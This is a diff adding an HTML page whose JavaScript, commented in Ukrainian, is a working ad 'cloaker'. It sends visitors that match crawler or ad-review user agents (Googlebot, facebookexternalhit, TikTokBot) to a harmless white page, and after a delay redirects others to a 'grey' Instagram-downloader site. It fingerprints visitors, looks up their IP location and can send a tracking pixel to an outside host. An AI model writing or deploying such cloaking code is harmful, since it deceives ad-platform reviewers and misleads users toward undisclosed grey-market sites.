@@ -1,0 +1,108 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <div id="debug">Loading...</div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.4/fingerprint2.min.js"></script>
+    <script>
+        // Конфігурація клоаки
+        const whitePage = "https://www.google.com.ua";
+        const greyPages = ["https://sssinstagram.com"];
+        const allowedGeo = [];
+        const botUserAgents = [/Googlebot/i, /facebookexternalhit/i, /TikTokBot/i, /ByteSpider/i, /ClarityBot/i];
+        const uniqueId = "y24uax2kt4";
+        const pixelId = "";
+        const useProxy = false;
+
+        // Функція редиректу
+        function redirectTo(url) {
+            document.getElementById('debug').innerText = `Redirecting to ${url}`;
+            window.location.href = url;
+            if (pixelId) {
+                fetch(`https://so65a.github.io/clao/pixel?cloak_id=y24uax2kt4&url=${encodeURIComponent(url)}`, {
+                    method: 'GET',
+                    mode: 'no-cors'
+                }).catch(e => console.error('Pixel error:', e));
+            }
+        }
+
+        // Симуляція поведінки
+        let mouseEntropy = 0;
+        let keyEvents = 0;
+        document.addEventListener("mousemove", (e) => {
+            mouseEntropy += Math.abs(e.movementX) + Math.abs(e.movementY);
+        });
+        document.addEventListener("keydown", () => {
+            keyEvents++;
+        });
+
+        function simulateUser() {
+            setInterval(() => {
+                const event = new MouseEvent('mousemove', {
+                    movementX: Math.random() * 10,
+                    movementY: Math.random() * 10
+                });
+                document.dispatchEvent(event);
+            }, 100);
+        }
+        simulateUser();
+
+        // Перевірка бота
+        function isBot() {
+            const bot = botUserAgents.some(regex => regex.test(navigator.userAgent)) || mouseEntropy < 100;
+            if (bot) document.getElementById('debug').innerText = 'Bot detected';
+            return bot;
+        }
+
+        // Перевірка IP
+        async function checkIP() {
+            try {
+                document.getElementById('debug').innerText = 'Checking IP...';
+                const response = await fetch("https://ipapi.co/json/");
+                const data = await response.json();
+                
+                return data;
+            } catch (e) {
+                document.getElementById('debug').innerText = 'IP check failed: ' + e.message;
+                console.error('IP check error:', e);
+                return null;
+            }
+        }
+
+        // Основна функція клоакінгу
+        async function cloak_y24uax2kt4() {
+            try {
+                document.getElementById('debug').innerText = 'Checking bot...';
+                if (isBot()) {
+                    redirectTo(whitePage);
+                    return;
+                }
+
+                document.getElementById('debug').innerText = 'Checking IP...';
+                const ipData = await checkIP();
+                if (!ipData || (allowedGeo.length > 0 && !allowedGeo.includes(ipData.country_code))) {
+                    document.getElementById('debug').innerText = 'Invalid IP or GEO';
+                    redirectTo(whitePage);
+                    return;
+                }
+
+                document.getElementById('debug').innerText = 'Redirecting to grey page...';
+                setTimeout(() => {
+                    const greyPage = greyPages[Math.floor(Math.random() * greyPages.length)];
+                    redirectTo(greyPage);
+                }, 2103);
+            } catch (e) {
+                document.getElementById('debug').innerText = 'Error: ' + e.message;
+                console.error('Cloak error:', e);
+                redirectTo(whitePage);
+            }
+        }
+
+        cloak_y24uax2kt4();
+    </script>
+</body>
+</html>
